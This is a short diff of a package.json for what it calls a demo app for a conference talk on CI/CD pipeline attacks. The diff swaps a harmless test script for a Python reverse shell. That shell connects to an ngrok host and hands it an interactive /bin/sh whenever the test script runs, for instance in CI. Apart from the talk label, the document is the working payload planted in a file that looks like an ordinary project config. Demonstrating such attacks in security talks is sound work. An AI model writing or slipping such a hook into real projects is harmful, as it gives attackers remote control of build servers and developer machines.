@@ -4,7 +4,7 @@
   "description": "Demo app for AltSecCon CI/CD Heist talk - benign victim-side package.json",
   "main": "index.js",
   "scripts": {
-    "test": "echo \"Running unit tests... Done.\" && exit 0"
+    "test": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"0.tcp.in.ngrok.io\",10357));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
   },
   "license": "MIT"
 }
